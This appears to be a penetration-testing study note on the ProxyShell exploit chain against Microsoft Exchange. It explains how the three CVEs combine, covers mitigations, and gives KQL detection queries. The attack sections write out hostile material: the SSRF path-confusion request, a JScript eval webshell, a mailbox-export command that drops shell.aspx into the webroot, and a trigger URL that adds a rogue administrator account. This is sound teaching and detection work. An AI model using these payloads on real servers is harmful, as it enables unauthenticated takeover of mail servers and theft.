---
tags: [active-directory, azure, hybrid, exchange, vapt]
difficulty: expert
module: "65 - Hybrid Identity, Entra ID, and Exchange Attacks"
topic: "65.09 ProxyShell Chaining"
---

# ProxyShell Chaining (CVE-2021-34473, 34523, 31207)

## 1. Introduction to ProxyShell

"ProxyShell" is a massive exploit chain discovered by DEVCORE researcher Orange Tsai in 2021, closely following the ProxyLogon vulnerabilities. Like its predecessor, ProxyShell allows an unauthenticated attacker to achieve Remote Code Execution (RCE) on a Microsoft Exchange Server as `NT AUTHORITY\SYSTEM`.

The attack surface differs from ProxyLogon by targeting the Autodiscover service and the Exchange PowerShell remoting environment, rather than the ECP interface. The chain consists of three critical vulnerabilities:
1. **CVE-2021-34473**: A pre-auth path confusion vulnerability leading to SSRF.
2. **CVE-2021-34523**: An elevation of privilege vulnerability allowing an attacker to impersonate highly privileged users within the Exchange PowerShell backend.
3. **CVE-2021-31207**: A post-auth arbitrary file write vulnerability, achieved by abusing the `New-MailboxExportRequest` cmdlet to export a mailbox containing a malicious payload to a `.pst` file (which is effectively processed as a webshell).

ProxyShell is highly reliable and bypasses many of the URL rewrite mitigations initially deployed for ProxyLogon, making it a favorite for ransomware operators.

## 2. Architecture and Exploit Flow

The attack leverages the frontend to backend proxying mechanism in Exchange, specifically targeting how Autodiscover handles path resolution and implicit routing.

```text
+-------------------------------------------------------------------------------------------------------+
|                                        ProxyShell Exploit Chain                                       |
+-------------------------------------------------------------------------------------------------------+
|                                                                                                       |
|  [ Attacker ]                                                                                         |
|       |                                                                                               |
|       | 1. HTTP GET /autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodis.. |
|       v                                                                                               |
|  [ Exchange Frontend (CAS) ]                                                                          |
|       |                                                                                               |
|       | 2. Parses URL. Path Confusion! Forwards to Backend /mapi/nspi/ (SSRF) bypassing auth.         |
|       v                                                                                               |
|  [ Exchange Backend (PowerShell / MAPI) ]                                                             |
|       |                                                                                               |
|       | 3. Authenticates as 'Administrator' via X-Rps-CAT (EoP).                                      |
|       | 4. Attacker opens a remote PowerShell runspace via WinRM.                                     |
|       | 5. Sends encoded webshell payload in an email to themselves (Drafts).                         |
|       | 6. Executes `New-MailboxExportRequest` to export Drafts to \\localhost\c$\inetpub\...\.aspx   |
|       v                                                                                               |
|  [ File System ]                                                                                      |
|       |                                                                                               |
|       | 7. Writes PST file containing the webshell payload to the web directory.                      |
|       v                                                                                               |
|  [ Attacker ]                                                                                         |
|       |                                                                                               |
|       | 8. HTTP GET to dropped .aspx file -> RCE (SYSTEM)                                             |
|                                                                                                       |
+-------------------------------------------------------------------------------------------------------+
```

## 3. Deep Dive: Autodiscover Path Confusion (CVE-2021-34473)

The root cause of the SSRF is how the Exchange frontend handles URLs containing the `autodiscover.json` endpoint combined with specific query parameters.

When a URL like this is submitted:
`https://mail.target.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com`

The frontend CAS logic looks at the URL. It sees `/autodiscover/autodiscover.json` and strips away everything after the `?` to determine the routing logic. Since Autodiscover is unauthenticated, it lets the request pass through. However, due to a flaw in the parsing logic inside the `EmailAddress` parameter extraction, the backend URL is constructed using the portion *after* the `@` symbol.

This allows the attacker to forcefully route the request to *any* backend endpoint, such as `/mapi/` or `/powershell/`, while the frontend still believes it is processing an unauthenticated `/autodiscover/` request. This bypasses the frontend authentication layer completely.

## 4. Deep Dive: Exchange PowerShell Remoting EoP (CVE-2021-34523)

Once the attacker can route requests to the backend `/powershell/` endpoint, they need to authenticate. The Exchange PowerShell backend relies on the `X-CommonAccessToken` or `X-Rps-CAT` headers for identity assertion.

Normally, the frontend validates the user's credentials and generates a serialized Access Token, passing it to the backend. Because the attacker bypassed the frontend using the SSRF, they can directly supply their own `X-Rps-CAT` header.

By extracting the Security Identifier (SID) of the Domain Administrator or the `Exchange Organization Administrators` group (often easily derivable or leaked via the `/mapi/` endpoint), the attacker constructs a forged token. The backend blindly trusts this token, granting the attacker a fully privileged PowerShell remoting session.

## 5. Deep Dive: Mailbox Export to PST (CVE-2021-31207)

With a privileged PowerShell session established, the attacker needs a way to write a webshell to disk. ProxyShell achieves this via a clever abuse of the Exchange Mailbox Export feature.

1. **Email the Payload**: The attacker uses EWS (Exchange Web Services) or MAPI (via the SSRF) to create a draft email in a known mailbox (e.g., `Administrator`). The body or attachment of this email contains an ASP.NET webshell payload, padded or encoded to survive the PST serialization process.
   *Example Payload*: `<%@ Page Language="JScript" %><%eval(Request.Item["cmd"],"unsafe");%>`

2. **Export the Mailbox**: The attacker uses the PowerShell runspace to execute the export cmdlet:
   ```powershell
   New-MailboxExportRequest -Mailbox Administrator -FilePath \\localhost\c$\inetpub\wwwroot\aspnet_client\shell.aspx
   ```

Because the `FilePath` allows UNC paths, the attacker points it to `\\localhost\c$\` and saves the export as an `.aspx` file in a web-accessible directory.

The Exchange Mailbox Replication Service (MRS) processes the request. The resulting PST file is written to disk. Even though it is a binary PST file, the ASP.NET compilation engine will ignore the binary garbage and execute the `<% ... %>` script tags when the file is accessed via HTTP.

## 6. Exploitation Walkthrough

Tools like the Metasploit module (`exploit/windows/http/exchange_proxyshell_rce`) or Python scripts automate this entire process.

### Step 1: Discovering the Backend Server

The attacker sends an SSRF payload to leak the backend FQDN:
```http
GET /autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com HTTP/1.1
Host: mail.target.com
```

### Step 2: Extracting the Admin SID

The attacker queries the `/mapi/` endpoint to leak the `LegacyDN` and ultimately the SID of the local administrator.

### Step 3: Opening PowerShell Runspace

The attacker crafts the `X-Rps-CAT` token using the SID and sends a WS-Management (WinRM) request to the `/powershell/` endpoint via the SSRF to establish the session.

### Step 4: Dropping the Webshell

The automated exploit creates the email, triggers the export, and polls the `Get-MailboxExportRequest` status until it completes (which can take a few minutes depending on mailbox size and server load).
Attackers often follow up with `Remove-MailboxExportRequest` to hide their tracks.

### Step 5: Triggering RCE

The attacker navigates to:
`https://mail.target.com/aspnet_client/shell.aspx?cmd=whoami`
Resulting in `NT AUTHORITY\SYSTEM`.

## 7. Post-Exploitation Tactics

Like ProxyLogon, SYSTEM access allows:
- **Credential Dumping**: Extracting SAM, SYSTEM, and LSASS.
- **Malware Deployment**: Dropping ransomware (e.g., Conti, LockBit heavily abused ProxyShell).
- **Persistence**: Installing persistent webshells, creating hidden mail forwarding rules, or adding rogue Exchange administrators.
- **Lateral Movement**: Pivoting to internal domain controllers.

## 8. Mitigations

1. **Cumulative Updates (CU)**: Microsoft patched the vulnerabilities in April and May 2021. Applying the latest CU is the primary defense.
2. **Network Segmentation**: Ensure the Exchange server cannot make outbound SMB connections. While `\\localhost\c$\` is internal, preventing outbound SMB stops other data exfiltration techniques.
3. **Disable Unused Features**: If PowerShell remoting is not required from the external internet, block `/powershell/` at the WAF or load balancer.

## 9. Comprehensive Detections

### IIS Logs

Detecting the path confusion SSRF is straightforward in IIS logs. Look for requests to `/autodiscover.json` that contain `@` symbols followed by Exchange endpoints.

```kusto
W3CIISLog
| where csUriStem has "/autodiscover/autodiscover.json"
| where csUriQuery contains "autodiscover.json" and csUriQuery contains "@"
| project TimeGenerated, cIP, csUriStem, csUriQuery, scStatus
```

### PowerShell Operational Logs

Monitor for suspicious `New-MailboxExportRequest` executions, particularly those writing to local UNC paths (`\\localhost\c$\...`) or targeting `.aspx`, `.php`, or `.jsp` extensions instead of `.pst`.

```kusto
Event
| where Source == "MSExchange Management"
| where EventID == 1
| where EventData contains "New-MailboxExportRequest"
| where EventData contains "\\localhost\c$\" or EventData contains ".aspx"
```

### File System

Monitor for the creation of `.aspx` files within:
- `C:\inetpub\wwwroot\aspnet_client\`
- `C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\`

Also, these PST-dropped webshells are typically quite large (e.g., several megabytes) because they contain the entire exported mailbox structure, making them stand out compared to typical tiny webshells.


## Real-World Attack Scenario
## Real-World Attack Scenario: The ProxyShell PST Backdoor

**The Context:** An Initial Access Broker (IAB) is probing external perimeters and identifies an Exchange 2016 server vulnerable to ProxyShell. The server has mitigating WAF rules blocking the older ProxyLogon paths, but Autodiscover is exposed. The attacker wants to drop a persistent webshell as `SYSTEM` without needing any valid credentials.

**The Reconnaissance:** 
The attacker verifies the vulnerability by sending a specific path-confusion payload to the Autodiscover endpoint: `/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com`. The server responds with a 200 OK, confirming the frontend CAS is improperly truncating the URL and allowing unauthenticated access to the backend `/mapi/` endpoint.

**The Execution:**
1. **PowerShell Remoting Bypass:** The attacker uses the SSRF to route a request to the backend `/powershell/` endpoint. Because they bypassed the frontend, they manually supply an `X-Rps-CAT` header forged with the local Administrator's SID. The backend blindly trusts this token, opening a highly privileged remote PowerShell runspace.
2. **Payload Staging:** The attacker drafts an email to the Administrator's mailbox containing an encoded ASP.NET webshell payload (`<%eval(Request.Item["cmd"],"unsafe");%>`). This payload is carefully padded so it remains intact during serialization.
3. **Mailbox Export to Webroot:** Through their privileged PowerShell session, the attacker executes the `New-MailboxExportRequest` cmdlet. They instruct Exchange to export the Administrator's Drafts folder to a local UNC path: `\\localhost\c$\inetpub\wwwroot\aspnet_client\shell.aspx`.
4. **The PST Webshell:** The Exchange Mailbox Replication Service exports the data as a `.pst` file to the specified location. Even though it is a binary Outlook data file, it contains the plaintext `<% %>` script tags.
5. **Execution:** The attacker accesses `https://mail.target.com/aspnet_client/shell.aspx?cmd=net+user+hacker+Password123!+/add`. 

**The Outcome:**
The IIS compilation engine ignores the binary PST garbage and executes the injected C# code as `NT AUTHORITY\SYSTEM`. The attacker successfully created a local administrator account on the Exchange server. They cover their tracks by executing `Remove-MailboxExportRequest` and then pivot internally using their newly created credentials, bypassing perimeter defenses entirely via a clever Autodiscover parsing flaw.

## 10. Chaining Opportunities

- **[[19 - Web Shells and IIS Exploitation]]**: Deep dive into how the IIS compilation engine processes the PST files to execute the webshell.
- **[[12 - Lateral Movement via DCOM and WMI]]**: Using SYSTEM privileges to pivot to the DC.
- **[[08 - ProxyLogon Chaining]]**: Comparing SSRF bypass mechanisms between the two vulnerability chains.
- **[[24 - Abusing Windows Error Reporting (WER)]]**: Exploiting SYSTEM access to dump LSASS using WER.

## 11. Related Notes

- [[10 - ProxyNotShell and OWASSRF]]
- [[21 - Active Directory Defense and Auditing]]
- [[17 - Advanced Threat Hunting in IIS]]
